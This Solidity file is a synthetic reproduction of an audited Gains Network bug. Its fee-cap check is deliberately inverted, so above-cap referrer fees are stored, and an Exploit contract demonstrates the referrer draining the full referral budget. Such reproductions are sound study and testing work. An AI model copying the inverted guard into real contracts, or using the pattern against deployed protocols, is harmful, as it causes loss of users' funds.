// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Gains Network — updateStartReferrerFeeP compares the wrong way
    (Pashov, finding #37791)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: the guard is `if (_value <= MAX) revert AboveMax()`.
    Every fee inside the published cap reverts, and every fee above the
    cap is stored. Governance's attempt to set the 50% cap fails. Storing
    100% (1e10) succeeds. distributeReferralReward then pays the referrer
    the entire 1000 token referral budget instead of the capped 500, and
    the protocol half is gone. */

contract ERC20 {
    string public symbol = "DAI";
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Referrer {}

error AboveMax();

contract Referrals {
    uint256 public constant PRECISION = 1e10;
    uint256 public constant MAX_START_REFERRER_FEE_P = 5e9; // 50% of the referral budget
    ERC20 public token;
    address public gov;
    address public referrer;
    bool public fixedMode;
    uint256 public startReferrerFeeP;
    uint256 public paid;

    constructor(ERC20 t, address g, address r, bool fixed_) {
        token = t;
        gov = g;
        referrer = r;
        fixedMode = fixed_;
    }

    function updateStartReferrerFeeP(uint256 _value) external {
        require(msg.sender == gov, "gov");
        if (fixedMode) {
            // FIX: reject values above the cap
            if (_value > MAX_START_REFERRER_FEE_P) revert AboveMax();
        } else if (_value <= MAX_START_REFERRER_FEE_P) {
            revert AboveMax(); // @> VULN: in-range fees revert and above-cap fees are stored
        }
        startReferrerFeeP = _value;
    }

    function distributeReferralReward(uint256 referralBudget) external {
        uint256 cut = referralBudget * startReferrerFeeP / PRECISION;
        token.transfer(referrer, cut);
        paid = cut;
    }
}

contract Exploit {
    ERC20 public token; // nonce 1
    Referrer public referrer; // nonce 2
    Referrals public referrals; // nonce 3
    bool public capRejected;

    constructor() {
        token = new ERC20();
        referrer = new Referrer();
        referrals = new Referrals(token, address(this), address(referrer), false);
        token.mint(address(referrals), 1000 ether);
    }

    function run() external {
        (bool ok,) = address(referrals).call(
            abi.encodeWithSelector(Referrals.updateStartReferrerFeeP.selector, referrals.MAX_START_REFERRER_FEE_P())
        );
        capRejected = !ok;
        require(capRejected, "the 50% cap was accepted");
        referrals.updateStartReferrerFeeP(referrals.PRECISION());
        referrals.distributeReferralReward(1000 ether);
        require(referrals.startReferrerFeeP() == 1e10, "100% was not stored");
        require(token.balanceOf(address(referrer)) == 1000 ether, "referrer took the whole budget");
        require(token.balanceOf(address(referrals)) == 0, "protocol half was not kept");
    }
}
